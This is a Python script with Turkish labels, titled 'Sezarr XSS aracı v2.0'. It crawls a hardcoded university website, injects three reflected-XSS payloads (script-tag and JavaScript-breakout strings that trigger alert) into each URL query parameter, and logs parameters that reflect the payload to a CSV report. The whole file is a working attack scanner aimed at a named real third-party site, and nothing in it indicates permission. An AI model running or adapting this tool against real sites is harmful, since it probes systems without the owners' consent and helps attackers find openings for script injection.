from bs4 import BeautifulSoup
import csv
import urllib.parse
import requests
import sys

if sys.platform.startswith("win"):
    try:
        import os
        os.system("")
    except:
        pass

C_RED = "\033[91m"
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_CYAN = "\033[96m"
C_RESET = "\033[0m"

BANNER = f"""{C_CYAN}
  ███████╗███████╗███████╗ █████╗ ██████╗ ██████╗ 
  ██╔════╝██╔════╝╚══███╔╝██╔══██╗██╔══██╗██╔══██╗
  ███████╗█████╗    ███╔╝ ███████║██████╔╝██████╔╝
  ╚════██║██╔══╝   ███╔╝  ██╔══██║██╔══██╗██╔══██╗
  ███████║███████╗███████╗██║  ██║██║  ██║██║  ██║
  ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
{C_RESET}  {C_YELLOW}Sezarr XSS aracı v2.0 {C_RESET}
--------------------------------------------------"""

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
}

XSS_PAYLOADS = [
    '"><script>alert(document.domain)</script>',
    "</title><script>alert(1)</script>",
    "';alert(String.fromCharCode(88,83,83));//",
]

def guvenli_url_uret(base_url, query_params, param_adi, yeni_deger):
    parsed = urllib.parse.urlparse(base_url)
    yeni_params = query_params.copy()
    yeni_params[param_adi] = yeni_deger
    encoded_query = urllib.parse.urlencode(yeni_params, doseq=True)
    
    return urllib.parse.urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        encoded_query,
        parsed.fragment
    ))

def parametreleri_test_et(current_url):
    bulgular = []
    parsed_url = urllib.parse.urlparse(current_url)
    query_params = dict(urllib.parse.parse_qsl(parsed_url.query))

    if not query_params:
        return bulgular

    try:
        resp = requests.get(current_url, headers=HEADERS, timeout=5)
        if resp.status_code != 200:
            return bulgular

        for param_adi in query_params.keys():
            for payload in XSS_PAYLOADS:
                test_url = guvenli_url_uret(current_url, query_params, param_adi, payload)

                try:
                    t_resp = requests.get(test_url, headers=HEADERS, timeout=4)
                    
                    if payload in t_resp.text:
                        if payload not in resp.text:
                            bulgular.append({
                                "URL": test_url,
                                "Zafiyet": "Reflected XSS",
                                "Risk": "Yüksek",
                                "Parametre": param_adi,
                                "Payload": payload
                            })
                            print(f"{C_RED}    [!] XSS YAKALANDI! [{param_adi}] -> {payload}{C_RESET}")
                except:
                    continue
    except:
        pass

    return bulgular

def siteyi_tara_va_avla(ana_url):
    print(f"\n{C_CYAN}[*] Site Taranıyor (Crawler Aktif): {ana_url}{C_RESET}")
    visited = set()
    to_visit = {ana_url}
    toplam_bulgular = []

    parsed_ana = urllib.parse.urlparse(ana_url)
    domain_root = f"{parsed_ana.scheme}://{parsed_ana.netloc}"

    while to_visit and len(visited) < 20:
        current_url = to_visit.pop()
        if current_url in visited:
            continue
        visited.add(current_url)

        print(f"  [-] İncelenen Sayfa: {current_url}")

        bulgular = parametreleri_test_et(current_url)
        toplam_bulgular.extend(bulgular)

        try:
            resp = requests.get(current_url, headers=HEADERS, timeout=5)
            if "text/html" in resp.headers.get("Content-Type", ""):
                soup = BeautifulSoup(resp.text, "html.parser")
                for link in soup.find_all("a", href=True):
                    full_link = urllib.parse.urljoin(domain_root, link["href"])
                    if urllib.parse.urlparse(full_link).netloc == parsed_ana.netloc:
                        if full_link not in visited:
                            to_visit.add(full_link)
        except:
            pass

    return toplam_bulgular

def main():
    print(BANNER)
    
    hedef_site = "https://1403.iee.ihu.gr/"

    sonuclar = siteyi_tara_va_avla(hedef_site)
    
    # --- CSV DOSYASINA KAYDETME İŞLEMİ ---
    rapor_adi = "sezarr_xss_raporu.csv"
    with open(rapor_adi, mode="w", newline="", encoding="utf-8-sig") as f:
        fieldnames = ["URL", "Zafiyet", "Risk", "Parametre", "Payload"]
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        
        writer.writeheader()
        for bulgu in sonuclar:
            writer.writerow(bulgu)

    print(f"\n{C_GREEN}[+] Tarama Tamamlandı! Toplam XSS: {len(sonuclar)}{C_RESET}")
    print(f"{C_GREEN}[+] Rapor başarıyla kaydedildi: '{rapor_adi}'{C_RESET}")
    
    # --- UYGULAMANIN KAPANMASINI ÖNLEYEN KISIM ---
    print(f"\n{C_YELLOW}Çıkış yapmak için lütfen ENTER tuşuna basın...{C_RESET}")
    input()

if __name__ == "__main__":
    main()